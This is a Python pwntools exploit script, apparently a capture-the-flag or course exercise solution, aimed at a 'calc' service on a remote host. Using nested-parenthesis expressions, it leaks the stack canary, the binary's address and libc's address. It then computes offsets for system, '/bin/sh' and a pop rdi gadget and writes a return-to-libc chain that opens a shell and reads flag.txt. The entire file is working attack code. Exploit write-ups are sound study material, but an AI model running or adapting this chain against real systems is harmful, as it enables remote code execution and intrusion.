from pwn import *

# function from https://github.com/olearczuk/MIMUW-BSK/tree/master/Pwn/
def to_double_str(i):
    if not isinstance(i, str):
        i = hex(i)
    return str(struct.unpack('>d', bytes.fromhex(i[2:].zfill(16)))[0])

with context.local(log_level = 'info'):

        off_pop_rdi_ret = 0x1c73                                       # from our binary
        #off_pop_rdi_ret = 0x27b15                                     # from libc NOT USED
        off_system = 0x4a830
        off_binsh = 0x18de78
        off_libc_start_main = 0x28152
        off_main = 0x1bdb

        canary_var_payload = 'c=' + '(' * 33 + ')' * 32
        fix_canary_payload = '+(c-' + '(' * 27 + 'c' + ')' * 28
        main_ret_var_payload = "m=" + '(' * 35 + ')'*34
        libc_var_payload = 'l=' + '(' * 33 + '0+' + '('*4 + ')' * 36
        put_system = 't=' + '('*31 + '0+1*(s' + ')'*32
        put_binsh = 't=' + '('*31 + '0+1*b' + ')'*31
        put_pop_rdi = 't=' + '('*31 + '0+(p' + ')'*32

        #conn = process("./calc", env={"LD_PRELOAD": "libc.so.6"})     # local
        conn = remote('h4x.0x04.net', 31337)                           # remote

        conn.send(canary_var_payload + "\n")                           # get canary
        conn.send(main_ret_var_payload + fix_canary_payload + "\n")    # get compute return address
        conn.send(libc_var_payload + fix_canary_payload + "\n")        # get main return address

        conn.send("l=l-" + to_double_str(off_libc_start_main) + "\n")  # l -> start of libc
        conn.send("m=m-" + to_double_str(off_main) + "\n")             # m -> start of executable binary
        conn.send("p=m+" + to_double_str(off_pop_rdi_ret) + "\n")      # p -> true address of pop rdi; ret
        #conn.send("p=l+" + to_double_str(off_pop_rdi_ret) + "\n")     # gadget from libc NOT USED
        conn.send("s=l+" + to_double_str(off_system) + "\n")           # s -> true address of system
        conn.send("b=l+" + to_double_str(off_binsh) + "\n")            # b -> true address of /bin/sh
        conn.send(put_system + "\n")                                   # put system function address
        conn.send(put_binsh + "\n")                                    # put "/bin/sh" before
        conn.send(put_pop_rdi + "\n")                                  # put pop rdi; ret before
        conn.send("cat flag.txt\n")
        print(conn.recvline().decode())
        #conn.interactive()